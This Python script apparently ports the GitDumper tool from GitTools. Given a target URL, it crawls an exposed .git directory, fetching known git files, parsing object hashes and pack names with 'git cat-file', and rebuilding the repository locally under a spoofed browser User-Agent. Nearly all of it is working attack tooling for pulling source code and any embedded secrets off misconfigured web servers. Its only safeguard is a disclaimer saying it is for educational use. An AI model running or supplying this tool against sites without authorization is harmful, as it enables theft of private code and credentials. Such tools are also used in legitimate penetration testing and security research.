#!/usr/bin/env python3

import argparse, sys
from urllib.request import urlopen
from urllib.error import HTTPError, URLError
import os, re
import requests
import subprocess

QUEUE = []
DOWNLOADED = []
BASEURL = ""
BASEDIR = ""
GITDIR = ""
BASEGITDIR = ""

def main():
    global QUEUE
    global DOWNLOADED
    global BASEURL
    global BASEDIR
    global GITDIR
    global BASEGITDIR
    print("""
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
# Revrited to python by Gorlik
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
""")

    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', default='http://target.tld/.git/', help='input url')
    parser.add_argument('-d', '--dest', default='dest-dir', help='destination dir')
    args = parser.parse_args()

    if args.url == "http://target.tld/.git/":
        print("[*] USAGE: http://target.tld/.git/ dest-dir [--git-dir=otherdir]")
        return


    BASEURL=  args.url
    BASEDIR= args.dest
    GITDIR= ".git" # todo parametr to change
    BASEGITDIR = BASEDIR+"/"+GITDIR+"/"

    if GITDIR not in BASEURL:
        print("\033[31m[-] /$GITDIR/ missing in url\033[0m")
        return
    
    if os.path.isdir(BASEGITDIR) == False:
        print("\033[33m[*] Destination folder does not exist\033[0m")
        print("\033[32m[+] Creating "+BASEGITDIR+"\033[0m")
        os.makedirs(BASEGITDIR)

    start_download()

    print("Finished")

def start_download():
    #Add initial/static git files
    global QUEUE
    global DOWNLOADED
    global BASEURL
    global BASEDIR
    global GITDIR
    global BASEGITDIR
    QUEUE.append('HEAD')
    QUEUE.append('objects/info/packs')
    QUEUE.append('description')
    QUEUE.append('config')
    QUEUE.append('COMMIT_EDITMSG')
    QUEUE.append('index')
    QUEUE.append('packed-refs')
    QUEUE.append('refs/heads/master')
    QUEUE.append('refs/remotes/origin/HEAD')
    QUEUE.append('refs/stash')
    QUEUE.append('logs/HEAD')
    QUEUE.append('logs/refs/heads/master')
    QUEUE.append('logs/refs/remotes/origin/HEAD')
    QUEUE.append('info/refs')
    QUEUE.append('info/exclude')
    QUEUE.append('/refs/wip/index/refs/heads/master')
    QUEUE.append('/refs/wip/wtree/refs/heads/master')
    QUEUE.append('FETCH_HEAD') #
    QUEUE.append('ORIG_HEAD') #

    #Iterate through QUEUE until there are no more files to download
    while(len(QUEUE) > 0):
        download_item(QUEUE.pop(0))

def download_item(objname):
    global QUEUE
    global DOWNLOADED
    global BASEURL
    global BASEDIR
    global GITDIR
    global BASEGITDIR


    url= BASEURL+objname

    #Check if file has already been downloaded
    if objname in DOWNLOADED:
        return
    
    target= BASEGITDIR+objname

    #Create folder
    dir_path = os.path.dirname(objname)
    if os.path.isdir(dir_path) == False:
        try:
            os.makedirs(BASEGITDIR+"/"+dir_path+"/")
        except:
            pass

    #Download file
    headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", }
    r = requests.get(url, headers=headers)

    DOWNLOADED.append(objname) #Mark as downloaded and remove it from the queue

    if r.status_code == 200:
        open(target, 'wb').write(r.content)
    else:
        print("\033[31m[-] Downloaded (q:"+str(len(QUEUE))+"): "+objname+"\033[0m")
        return
    print("\033[32m[+] Downloaded (q:"+str(len(QUEUE))+"): "+objname+"\033[0m")

    #Check if we have an object hash
    if re.search(r'/[a-f0-9]{2}/[a-f0-9]{38}', objname):
        #Switch into $BASEDIR and save current working directory
        # unnesesssary >  cwd=BASEDIR in subprocess.run

        #Restore hash from $objectname
        hhash = objname.replace("/","").replace("objects","")
        command = str("git cat-file -t "+hhash+"").split(" ")
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=BASEDIR, universal_newlines=True)
        print("r1 {0} {1} {2} {3}".format(objname, result.returncode, result.stdout, result.stderr))
        if (result.returncode != 0):
            #Delete invalid file
            os.remove(target)
            return

        #Parse output of git cat-file -p $hash. Use strings for blobs
        if "blob" not in str(result.stdout):
            command = str("git cat-file -p "+hhash+"").split(" ")
            result2 = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=BASEDIR, universal_newlines=True, encoding="utf-8")
        else:
            command = str("git cat-file -p "+hhash+" | strings -a").split(" ")
            result2 = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=BASEDIR, universal_newlines=True, encoding="utf-8")

        print("r2 {0} {1} {2} {3}".format(objname, result2.returncode, result2.stdout, result2.stderr))
        matches = re.finditer(r"([a-f0-9]{40})", result2.stdout, re.MULTILINE)
        for match in matches:
            QUEUE.append("objects/"+match.group()[0:2]+"/"+match.group()[2:]+"")
        # end if

    #Parse file for other objects
    matches = re.finditer(r"([a-f0-9]{40})", r.text, re.MULTILINE)
    for match in matches:
        QUEUE.append("objects/"+match.group()[0:2]+"/"+match.group()[2:]+"")

    #Parse file for packs
    matches = re.finditer(r"(pack\-[a-f0-9]{40})", r.text, re.MULTILINE)
    for match in matches:
        QUEUE.append("objects/pack/"+match.group()+".pack")
        QUEUE.append("objects/pack/"+match.group()+".idx")

    return

if __name__ == '__main__':
    main()
